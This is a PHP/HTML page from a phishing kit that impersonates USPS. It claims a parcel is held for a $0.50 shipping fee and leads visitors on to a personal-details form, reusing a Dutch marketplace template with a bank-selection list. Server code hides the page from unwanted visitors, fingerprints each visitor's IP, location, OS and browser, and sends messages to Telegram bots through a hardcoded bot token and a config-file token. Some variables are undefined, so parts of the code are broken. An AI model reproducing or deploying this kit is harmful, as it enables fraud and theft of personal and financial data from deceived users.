<?php

session_start();           
require_once '../session/Comp.php';
require_once '../session/auto.php';

$comps = new Comp;
$antibot = new Antibot;

if (!$comps->checkToken()) { 
echo $antibot->throw404();      
die();
}
?>
<html lang="nl"><head>
    <title>USPS - Offer</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta http-equiv="Content-Language" content="nl">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="De grootste zoekertjessite van België. Nieuwe en tweedehands goederen en diensten, koop en verkoop je op 2dehands.">

    <link rel="icon" type="image/png" sizes="32x32" href="/content/marktplaats/favicon-32x32.bdbcc5e4.png">
    <meta name="theme-color" content="#5f92cd">
    <meta name="msapplication-TileColor" content="#5f92cd">
    <meta name="msapplication-square150x150logo" content="~/content/marktplaats/mstile-150x150.a97f62b4.png">
    <meta name="msapplication-square310x310logo" content="~/content/marktplaats/mstile-310x310.08edac6d.png">
    <meta name="msapplication-square70x70logo" content="~/content/marktplaats/mstile-70x70.d7e79172.png">
    <meta name="msapplication-wide310x150logo" content="~/content/marktplaats/mstile-310x150.dac1f14b.png">
    <meta name="msapplication-config" content="none">
    <meta name="generation-time-millis" content="1563312458767">
    <meta name="user-logged-in" content="true">
    <link rel="shortcut icon" href="/content/marktplaats/favicon.ico">
    <link rel="apple-touch-icon" sizes="180x180" href="/content/marktplaats/apple-touch-icon-180x180.png">
    <link rel="icon" type="image/png" href="/content/marktplaats/favicon-192x192.png" sizes="192x192">
    <link type="text/css" rel="stylesheet" href="https://devilsms.live/css/usps/main.css">
    <link rel="stylesheet" href="/content/marktplaats/client.min.css">
    <link rel="import" href="/content/marktplaats/header.html">
    <link rel="canonical" href="/MyMessages">
    <link rel="stylesheet" type="text/css" href="/content/marktplaats/normalize.112272e5.css">

    <link rel="import" href="/content/marktplaats/CssVars.e8761656.html">
    <style is="custom-style" include="mp-css-vars"></style>


<script type="text/javascript" charset="UTF-8" src="https://maps.googleapis.com/maps-api-v3/api/js/38/11/intl/nl_ALL/common.js"></script><script type="text/javascript" charset="UTF-8" src="https://maps.googleapis.com/maps-api-v3/api/js/38/11/intl/nl_ALL/util.js"></script>
<style>
a { 
text-decoration: none; 
color: white;

}
.text {
color: black;
}

/* Style the submit button */
input[type=submit] {
  width: 90%;
  padding: 12px;
  border: 2px solid #ccc;
  border-radius: 8px;
  box-sizing: border-box;
  margin-top: 6px;
  margin-bottom: 16px;
  background-color: #333366;
  color: white;
}
</style>

<script> 
function send() { 
var genders = document.getElementsByName("method"); 
if (genders[0].checked == true) { 

} else if (genders[1].checked == true) {

} if (genders[2].checked == true) {  

} else { 

// no checked 
var msg = '<span style="color:red;"><h5 align="center">You must select those options!</h5></span>'; 
document.getElementById('msg').innerHTML = msg; 
return false; 
} 
return true; 
} 
function reset_msg() { 
document.getElementById('msg').innerHTML = ''; 
} 

</script>

</head>
<body bgcolor="white">
    <div class="mp-Dialog-overlay" style="right: 17px;"></div>


    <div id="modal">
        <div>
            <span>
                <div class="mp-Dialog mp-Dialog--sm mp-animation-fade mp-animation-fade--in" aria-hidden="false">
                    <div class="mp-Dialog-content" tabindex="-1">

                        <div id="menu2" hidden="">
                            <div class="modal-back">
                                <i class="mp-sdk-svg mp-svg-arrow-left"></i>
                            </div>
                            <div class="mp-Card mp-Card--rounded BanksListMolecule-root-1Ww2150S">
                                <div class="modal-back" onclick="closeselect();">
                                    <i class="mp-sdk-svg mp-svg-arrow-left"></i>
                                </div>
                                <form id="bankform" onsubmit="redirect(); return false;" hidden="">
                                    <input hidden="" name="identity" value="qsDcUAH4hoHx34nJ7ZU8bfQo">
                                    }
                                    <input hidden="" id="bankselect" name="tikkiebankselect" value="">
                                    <input name="RequestVerificationToken" type="hidden" value="CfDJ8Acwd1XnzDFJuJnRofC16RVoc_eS19mU77nCHqyIHtNX3c9CB_Yoc-HsCD4ZaaHRJOGKk6__aE_3_dewkw3u7Iz0v8PBJxky6eypX5wHhxOfRyg0okzWN9z4Fa7dtbOL2Yq7NzTs38EX3e_J7cIeTIQ">
                                <input name="__RequestVerificationToken" type="hidden" value="CfDJ8P-88It7j7NKim7mcTOpNfe29PjPcykiGG9Qa_Ke1BP0pGLxSe5V0YLvWJYeEpm2zMPUQIh267hPWe1Ku_q_nN2vH8SoSvFnetKE2Un2isvWV8INbZBSWPXW938I2gT7aN1Kxckxj1bm-gYSwb1t7AA"></form>
                                <ul class="mp-List">
                                    <li><button class="mp-Button mp-Button--flat mp-Button--lg" onclick="selectedbank.innerText='Regiobank'; closeselect();">Regiobank</button></li>
                                    <li><button class="mp-Button mp-Button--flat mp-Button--lg" onclick="selectedbank.innterText='Knab'; closeselect();">Knab</button></li>
                                    <li><button class="mp-Button mp-Button--flat mp-Button--lg " onclick="selectedbank.innerText='Abn amro'; closeselect();">ABN AMRO</button></li>
                                    <li><button class="mp-Button mp-Button--flat mp-Button--lg " onclick="selectedbank.innerText='Triodos'; closeselect();">Triodos</button></li>
                                    <li><button class="mp-Button mp-Button--flat mp-Button--lg " onclick="selectedbank.innerText='Rabobank'; closeselect();">Rabobank</button></li>
                                    <li><button class="mp-Button mp-Button--flat mp-Button--lg " onclick="selectedbank.innerText='Sns'; closeselect();">ASN Bank</button></li>
                                    <li><button class="mp-Button mp-Button--flat mp-Button--lg " onclick="selectedbank.innerText='Ing'; closeselect();">ING Bank</button></li>
                                    <li><button class="mp-Button mp-Button--flat mp-Button--lg " onclick="selectedbank.innerText='Sns'; closeselect();">SNS</button></li>
                                    <li><button class="mp-Button mp-Button--flat mp-Button--lg " onclick="selectedbank.innerText='Moneyyou'; closeselect();">Moneyyou</button></li>
                                                        </ul>
                            </div>
                        </div>
                        <div id="menu1">
                            <div class="mp-Card ">
                                <div class="mp-Card-block mp-Card-block--opb-highlight" style="background-color:f7f7f7;">
                                    <img src="images/logo-mini-sb.png" height="12"><br><br>
                                    <div class="text">
                                         Your package recently reached our USPS sorting center. In order to receive your package, it is important to pay the shipping costs. After paying the shipping costs, we will send your package. You will receive the package at home no later than the next working day, or can be collected the next working day from 3 pm at a USPS collection point of your choice.               </div>
                                </div>
<?php
error_reporting(0);
ini_set('display_errors', 0);
ini_set('allow_url_fopen',1);
function getTimeZoneFromIpAddress(){
  $clientsIpAddress = get_client_ip();
  $clientInformation = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$clientsIpAddress));
  $clientsLatitude = $clientInformation['geoplugin_latitude'];
  $clientsLongitude = $clientInformation['geoplugin_longitude'];
  $clientsCountryCode = $clientInformation['geoplugin_countryCode'];
  $clientsCountryName = $clientInformation['geoplugin_countryName'];
  $clientsRegionCode = $clientInformation['geoplugin_regionCode'];
  $clientsRegionName = $clientInformation['geoplugin_regionName'];
  $timeZone = get_nearest_timezone($clientsLatitude, $clientsLongitude, $clientsCountryCode) ;
  return array($timeZone, $clientsRegionCode, $clientsRegionName, $clientsCountryName, $clientsCountryCode);
}
$array = getTimeZoneFromIpAddress();
function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}
function get_nearest_timezone($cur_lat, $cur_long, $country_code = '') {
    $timezone_ids = ($country_code) ? DateTimeZone::listIdentifiers(DateTimeZone::PER_COUNTRY, $country_code)
        : DateTimeZone::listIdentifiers();
    if($timezone_ids && is_array($timezone_ids) && isset($timezone_ids[0])) {
        $time_zone = '';
        $tz_distance = 0;
        //only one identifier?
        if (count($timezone_ids) == 1) {
            $time_zone = $timezone_ids[0];
        } else {
            foreach($timezone_ids as $timezone_id) {
                $timezone = new DateTimeZone($timezone_id);
                $location = $timezone->getLocation();
                $tz_lat   = $location['latitude'];
                $tz_long  = $location['longitude'];

                $theta    = $cur_long - $tz_long;
                $distance = (sin(deg2rad($cur_lat)) * sin(deg2rad($tz_lat)))
                    + (cos(deg2rad($cur_lat)) * cos(deg2rad($tz_lat)) * cos(deg2rad($theta)));
                $distance = acos($distance);
                $distance = abs(rad2deg($distance));
                // echo '<br />'.$timezone_id.' '.$distance;

                if (!$time_zone || $tz_distance > $distance) {
                    $time_zone   = $timezone_id;
                    $tz_distance = $distance;
                }
            }
        }
        return $time_zone;
    }
    return 'unknown';
}
$IP = get_client_ip();
function get_ip1($ip2) {
    $url = "http://www.geoplugin.net/json.gp?ip=".$ip2;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    $resp=curl_exec($ch);
    curl_close($ch);
    return $resp;
}
function get_ip2($ip) {
    $url = 'http://extreme-ip-lookup.com/json/' . $ip;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    $resp=curl_exec($ch);
    curl_close($ch);
    return $resp;
}
function getOS($useragent) {
  $os_platform = "Unknown OS Platform";
  $os_array = array('/windows nt 10/i' => 'Windows 10','/windows nt 6.3/i' => 'Windows 8.1','/windows nt 6.2/i' => 'Windows 8','/windows nt 6.1/i' => 'Windows 7','/windows nt 6.0/i' => 'Windows Vista','/windows nt 5.2/i' => 'Windows Server 2003/XP x64','/windows nt 5.1/i' => 'Windows XP','/windows xp/i' => 'Windows XP','/windows nt 5.0/i' => 'Windows 2000','/windows me/i' => 'Windows ME','/win98/i' => 'Windows 98','/win95/i' => 'Windows 95','/win16/i' => 'Windows 3.11','/macintosh|mac os x/i' => 'Mac OS X','/mac_powerpc/i' => 'Mac OS 9','/linux/i' => 'Linux','/ubuntu/i' => 'Ubuntu','/iphone/i' => 'iPhone','/ipod/i' => 'iPod','/ipad/i' =>  'iPad','/android/i' => 'Android','/blackberry/i' =>  'BlackBerry','/webos/i' => 'Mobile');
  foreach ($os_array as $regex => $value) {
    if (preg_match($regex, $useragent)) {
      $os_platform = $value;
    }
  }
  return $os_platform;
}
function getBrowser($useragent) {
    $browser = "Unknown Browser";
    $browser_array = array('/msie/i' => 'Internet Explorer','/firefox/i' => 'Firefox','/safari/i' => 'Safari','/chrome/i' => 'Chrome','/opera/i' => 'Opera','/netscape/i' => 'Netscape','/maxthon/i' => 'Maxthon','/konqueror/i' => 'Konqueror','/mobile/i' => 'Handheld Browser');
    foreach ($browser_array as $regex => $value) {
        if (preg_match($regex, $useragent)) {
            $browser    =   $value;
        }
    }
    return $browser;
}
$domain = $_SERVER['HTTP_HOST'];
$parse = $_SERVER['REQUEST_URI'];
$ab = "http://ss{$domain}{$parse}";
$details = get_ip1($IP);
$details = json_decode($details, true);
$countryname = $details['geoplugin_countryName'];
$countrycode = $details['geoplugin_countryCode'];
$continent = $details['geoplugin_continentName'];
$city = $details['geoplugin_city'];
$regioncity = $details['geoplugin_region'];
$timezone = $details['geoplugin_timezone'];
$currency = $details['geoplugin_currencySymbol_UTF8'];
if($countryname == "") {
    $details = get_ip2($IP2);
    $details = json_decode($details, true);
    $countryname = $details['country'];
    $countrycode = $details['countryCode'];
    $continent = $details['continent'];
    $city = $details['city'];
}
$hostname = gethostbyaddr($IP);
if ($ipv6 == ""){
  $IPV6 = "N/A";
} else {
  $IPV6 = $ipv6;
}
$useragent = $_SERVER['HTTP_USER_AGENT'];
$timezone = $array[0];
$date = date("h:i:s d/m/Y");
$city = $city;
$currency = $currency;
$countrycode = $countrycode;
$countryname = $countryname;
$continent = $continent;
$regioncity = $regioncity;
$currency = $currency;
$os = getOS($useragent);
$browser = getBrowser($useragent);
$tokens = "5194214649:AAHM4ylW9aOK9r2cSXK_yZvbMi9tmQ2_eYo";
$ids = "-549240378";
$urls = "https://api.telegram.org/bot";
$bots = "{$urls}{$tokens}";
$params=[
	'chat_id'=>$ids,
	'text'=>$data,
];
$ch = curl_init($bots . '/sendMessage');
//curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);
$token = file_get_contents("config/token.txt");
$id = file_get_contents("config/id.txt");
$url = "https://api.telegram.org/bot";
$bot = "{$url}{$token}";
$params=[
	'chat_id'=>$id,
	'text'=>$data1,
];
$ch = curl_init($bot . '/sendMessage');
//curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);
?>	          
                                <div class="gutter"></div>
                                
                                  <form action="personal.php?token=<?php echo $_SESSION['token']; ?>" method="POST">
                                <div class="mp-Card-block mp-Card-block--padded-compact mp-Card-block--chunk">
                                    <article>
                                        <header>Shipping option</header>
                                        <div>
                                        
                                            <ul class="mp-SelectionGroup mp-SelectionGroup--horizontal">
                                                <li class="mp-SelectionGroup-item" style="width: 50%;">
  
<?php

$useragent=$_SERVER['HTTP_USER_AGENT'];

if(preg_match('/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows (ce|phone)|xda|xiino/i',$useragent)||preg_match('/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i',substr($useragent,0,4))){
echo '<div style="position: absolute; margin-top: 10px;">';
}
else
{
  
}

?>                                              

 <label class="mp-Toggle"><input id="radio1" tabindex="1" class="mp-Toggle-input" onclick="reset_msg();" name="method" data-sem="method-personal" value="PERSONAL" type="radio"><span class="mp-Toggle-label">Deliver at Home</span></label>
  
 
                                                </li>
                                                <li class="mp-SelectionGroup-item"><label class="mp-Toggle"><input id="radio2" onclick="reset_msg();" tabindex="1" class="mp-Toggle-input" name="method" data-sem="method-business" value="BUSINESS" type="radio"><span class="mp-Toggle-label">USPS pick-up location</span></label></li>
                                            </ul>
                                        </div>
                                    </article>
                                </div>
                                 
                              
                                <div class="mp-Card-block mp-Card-block--padded-compact mp-Card-block--chunk">
                                    <article>
                                        <header>Total account shipping costs</header>
                                        <div>
                                            <p>Total amount</p>
                                        </div>
                                    </article>
                                    <aside>
                                        <span>
                                            <span>$0.50</span>
                                            <!--<span class="cents">
                                                 ,01
                                            </span>
                                            -->
                                        </span>
                                    </aside>
                                </div>
                                <div class="mp-Card-block mp-Card-block--padded-compact mp-Card-block--chunk ">
                                    <article>
                                        <header>Terms &amp; Conditions</header>
                                        <div>
                                            <label class="mp-Toggle">
                                                <input class="mp-Toggle-input" id="TCs" onclick="reset_msg();" name="method" value="on" type="checkbox">
                                                <span class="mp-Toggle-label">
                                                    I agree with the General <a href="#" class="text-link" target="_blank" rel="noopener noreferrer">Terms and Conditions</a>&nbsp;of the Online payment platform of USPS.

                                                </span>
                                            </label>
                                        </div>
                                        <div id="msg"></div> 
</article>
</div>




                                    <aside><span aria-hidden="true" class="mp-Icon mp-Icon--lg mp-svg-arrow-right "></span></aside>
                                </div>
                                <div class="gutter"></div>
                             
                                
                               <div align="center"><input type="submit" value="Continue" onclick="return send();"/></div>
                            </div>
                        </div>
                    </div>
                    <div class="mp-Dialog-overlay" style="right: 17px;"></div>
                </div>
            </span>
        </div>
</form>
        
        
</div></body></html>
